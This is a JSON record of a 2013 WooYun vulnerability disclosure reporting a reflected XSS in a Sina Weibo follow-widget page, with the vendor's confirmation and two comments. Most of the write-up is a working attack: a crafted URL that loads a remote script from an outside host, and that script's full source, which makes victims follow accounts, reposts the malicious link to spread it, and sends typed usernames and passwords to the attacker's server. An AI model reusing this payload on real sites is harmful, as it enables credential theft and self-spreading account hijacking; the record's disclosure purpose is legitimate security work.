{"id": 12015, "wybug_id": "wooyun-2013-023278", "wybug_title": "微博某常用页面反射型XSS(已钓鱼+关注+发微博)", "wybug_corp": "新浪微博", "wybug_author": "Millet", "wybug_date": "2013-05-08 11:45", "wybug_open_date": "2013-06-22 11:45", "wybug_type": "xss跨站脚本攻击", "wybug_level": "中", "wybug_rank_0": "10", "wybug_status": "厂商已经确认", "wybug_from": "http://www.wooyun.org", "wybug_tags": ["钓鱼欺诈", "反射型", "类型应用", "密码窃取", "利用技巧"], "wybug_detail": "漏洞详情 披露状态：   \t\t\t\t\t\t\t\t\t2013-05-08：\t细节已通知厂商并且等待厂商处理中\t\t\t\t\t\t\t\t\t2013-05-08：\t厂商已经确认，细节仅向厂商公开\t\t\t\t\t\t\t\t\t2013-05-18：\t细节向核心白帽子及相关领域专家公开\t\t\t\t\t\t\t\t\t2013-05-28：\t细节向普通白帽子公开\t\t\t\t\t\t\t\t\t2013-06-07：\t细节向实习白帽子公开\t\t\t\t\t\t\t\t\t2013-06-22：\t细节向公众公开  简要描述： 某常用页面的参数未过滤，附XSS利用过程。已帮忙关注乌云了，大家也来关注一下吧~~安全意识高的人越来越多了，看到weibo.com的域名也不点，反射型的XSS真心难，求持久化思路。 详细说明：  1.http://widget.weibo.com/dialog/follow.php 加关注页面，vsrc参数未过滤。2.http://widget.weibo.com/dialog/follow.php?fuid=1922455660&refer=&language=zh_cn&type=widget_page&vsrc=app_followbutton%27%7D%3Bonload=function%28%29%7BSTK.scriptLoader%28%7Burl%3A%27http%3A%2F%2Fmxss.sinaapp.com%2Ffish.js%27%7D%29%7D%3Bb%3D%7Ba%3A%27\n\n3.该页面有登录框，就不用自己写登录框了:)。\n/*进来后提交关注和发送微博，并点击“换个账号按钮”，显示登录框；给登录按钮和回车事件增加了发到g.php的动作；STK.jsonp来提交到g.php，STK.ajax来关注和发微博；后来又增加了发微话题，这个是有检查referer的，所以用一个iframe来做。*/var xss_url = \"http://widget.weibo.com/dialog/follow.php?fuid=1922455660&refer=&language=zh_cn&type=widget_page&vsrc=app_followbutton%27%7D%3Bonload=function%28%29%7BSTK.scriptLoader%28%7Burl%3A%27http%3A%2F%2Fmxss.sinaapp.com%2Ffish.js%27%7D%29%7D%3Bb%3D%7Ba%3A%27&r=\"+Math.random();var blogs = ['[BOBO害羞]看我如何一夜粉丝十万：',\t\t'有什么新鲜事想告诉大家？',\t\t'[lt切克闹]唷唷，切克闹。',\t\t'马刺VS勇士，加时赛。',\t\t'太贫困的人是不能重用，俗话说好日子过惯了难过穷日子。',\t\t'人们常常用咄咄逼人来掩饰弱点，只有软骨头才急躁粗暴，他们因此丧失了人的尊严。',\t\t'我等待，我观看。恩惠也许来，也许不来。',\t\t'也许这种既平静又不平静的等待就是恩惠的使者，或恩惠本身。',\t\t'京华记者现场对阵农夫山泉，8问8答激辩。',\t\t'爆灯姐丁东丽遭吐槽。',\t\t'淘宝客：中小卖家淘宝客运营实战篇。',\t\t'我们中出了2个叛徒，必须烧死。[蜡烛][蜡烛][蜡烛]',\t\t'次奥，这个炸弹两面都有胶！[崩溃]',\t\t'我不行了，这是我的申请书......',\t\t'敌人叫我们投降，我从了',\t\t'炸弹已安置完毕，请求撤离。队长，队长？'\t\t];var blog = blogs[Math.floor(Math.random()*blogs.length+1)];var topic = \"#报告队长#\";var logout_link = document.getElementsByClassName(\"logout_link\")[0];function m_post(){\t//show fish form\tif(logout_link) logout_link.click();\t//follow wooyun\tSTK.ajax({url:\"/relationship/aj_attention.php\",method:'post',args:{uid:1981622273},\t\tonComplete:function(){\t\t\t//follow me\t\t\tSTK.ajax({url:\"/relationship/aj_attention.php\",method:'post',args:{uid:1922455660},\t\t\tonComplete:function(){\t\t\t\t//add blog\t\t\t\tSTK.ajax({url:\"/public/aj_addMblog.php\",method:'post',args:{content:encodeURIComponent(blog+xss_url),appkey:1629860458},\t\t\t\tonComplete:function(){\t\t\t\t\t//create topic blog iframe\t\t\t\t\tvar ifm = document.createElement(\"iframe\");\t\t\t\t\tifm.src = \"/livestream/listlive.php\";\t\t\t\t\tifm.style.display = \"none\";\t\t\t\t\tifm.id=\"m_topic_ifm\";\t\t\t\t\tdocument.body.appendChild(ifm);\t\t\t\t\t//add topic blog\t\t\t\t\tifm.onload = function(){\t\t\t\t\t\tifm.contentWindow.STK.ajax({url:\"/livestream/addmblog.php\",method:'post',args:{content:encodeURIComponent(encodeURIComponent(topic+blog+xss_url)),appkey:2191225368,refer:'www.google.com.hk',language:'zh_cn',url_param:'',_t:0}});\t\t\t\t\t}\t\t\t\t}});\t\t\t}});\t\t}});}//fishvar m_submit = document.getElementsByClassName(\"submit_login_btn WB_btnD\")[0];if(m_submit){\tm_submit.onclick = function(){\t\tvar name = document.getElementsByClassName(\"WB_input input_account\")[0].value;\t\tvar pass = document.getElementsByClassName(\"WB_input input_password\")[0].value;\t\tSTK.jsonp({url:\"http://mxss.sinaapp.com/g.php?n=\"+encodeURIComponent(name)+\"&p=\"+encodeURIComponent(pass)});\t\t//post again\t\tsetTimeout(function(){m_post()},2000);\t}\tdocument.onkeydown = function(e){\t\tvar num = (e!=undefined)?e.keyCode:window.event.keyCode;\t\tif(num == 13){\t\t\tm_submit.onclick();\t\t}\t}}m_post();\n   漏洞证明：  一进来就有提交\n\n输入密码后提交并再次关注下\n\n账号密码来咯\n\n某人已关注并add blog\n\n   修复方案：  过滤噻。   版权声明：转载请注明来源 Millet@乌云\n ", "wybug_reply": "漏洞回应  厂商回应： 危害等级：中 漏洞Rank：10  确认时间：2013-05-08 13:51 厂商回复： 感谢关注新浪安全，已进入内部修复流程。 最新状态： 暂无  ", "replys": "漏洞评价：\n评论\n     2013-05-08 12:10 |    \t\t淡漠天空  \t\t\t( 实习白帽子  |\t\t\t        Rank:1113 漏洞数:141        | M:出售GOV  STATE NSA CIA NASA DHS Symant...)\t\t \n  可以猥琐思路    \n     2013-05-09 17:05 |    \t\t疯狗  \t\t\t( 实习白帽子  |\t\t\t        Rank:44 漏洞数:2        | 阅尽天下漏洞，心中自然无码。)\t\t \n  @Millet 精了~    \n  \n\n\n", "wybug_level_fromcorp": "中", "wybug_rank_fromcorp": 10, "Ranks": null}